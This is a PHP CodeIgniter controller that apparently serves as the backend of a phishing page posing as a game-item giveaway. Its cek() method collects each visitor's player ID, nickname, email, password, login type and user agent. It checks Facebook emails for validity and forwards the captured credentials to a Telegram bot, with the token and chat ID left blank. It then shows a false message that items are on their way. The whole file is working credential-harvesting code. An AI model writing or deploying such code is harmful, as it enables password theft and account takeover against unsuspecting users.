<?php

namespace App\Controllers;

use App\Libraries\cek;
use App\Libraries\send;

class Home extends BaseController
{
	public function __construct()
	{
		$this->cek = new cek();
		$this->send = new send();
	}
	public function index()
	{
		return view('awal');
	}
	public function cek()
	{
		$email = $this->request->getVar('email');
		$idplayer = $this->request->getVar('getUId');
		$nickplayer = $this->request->getVar('getNickId');
		$password = $this->request->getVar('password');
		$jenis = $this->request->getVar('login');

		session()->setTempdata('playId', $idplayer, 300);
		$ua = $_SERVER['HTTP_USER_AGENT'];

		$pesan = "Ada yang login : $jenis \n Id : $idplayer \n Nickname : $nickplayer \n Email: $email \n Password: $password \n UserAgent : $ua";

		$bottoken = '';
		$chatid = '';

		if ($jenis == 'Facebook') {
			$cookie = tempnam('cookies', md5($_SERVER['REMOTE_ADDR']) . '.txt');
			$cek = $this->cek->email($cookie, $email);
			if ($cek == 'valid') {
				$this->send->telegram($bottoken, $chatid, $pesan);
			} else {
				session()->setFlashdata('error', 'ID tidak cocok dengan akun FB');
				return redirect()->to(base_url(''));
			}
		} else {
			$this->send->telegram($bottoken, $chatid, $pesan);
		}
		session()->setFlashdata('selesai', 'Sedang logout, Item Masuk Secara Otomatis');
		return redirect()->to(base_url('sukses'));
	}

	public function sukses()
	{
		return view('suksess');
	}
}
